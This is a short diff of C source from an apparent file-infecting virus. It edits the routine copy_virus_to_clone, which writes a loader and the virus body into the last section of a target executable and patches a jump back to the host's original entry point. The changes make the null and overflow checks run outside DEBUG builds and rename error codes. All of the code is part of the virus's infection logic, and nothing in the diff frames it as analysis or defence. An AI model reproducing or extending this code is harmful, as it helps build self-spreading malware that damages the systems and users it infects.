@@ -12,9 +12,8 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref,  \
 	// copy loader and virus
 	void	*loader_location = safe(clone_ref, file_entry->end_of_last_section, vhdr->full_virus_size);
 
-#ifdef DEBUG
-	if (!loader_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-#endif
+	if (!loader_location) return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);
+
 	memcpy(loader_location, vhdr->loader_entry, vhdr->full_virus_size);
 
 	// gather offsets
@@ -34,14 +33,13 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref,  \
 	void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);
 
 	// safe memory and overflow check
-#ifdef DEBUG
 	if (back_to_client_jump == NULL
 	|| dist_client_entry_jump < (size_t)((int32_t)dist_client_entry_jump))
-		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-#endif
+		return errors(ERR_VIRUS, _ERR_V_COPY_VIRUS_TO_CLONE);
+
 	// write new addr into clone's loader code
 	if (!write_jump(back_to_client_jump, rel_jump_client, DWORD))
-		return errors(ERR_VIRUS, _ERR_COPY_LOADER_TO_CLONE);
+		return errors(ERR_VIRUS, _ERR_V_COPY_VIRUS_TO_CLONE);
 
 	return true;
 }
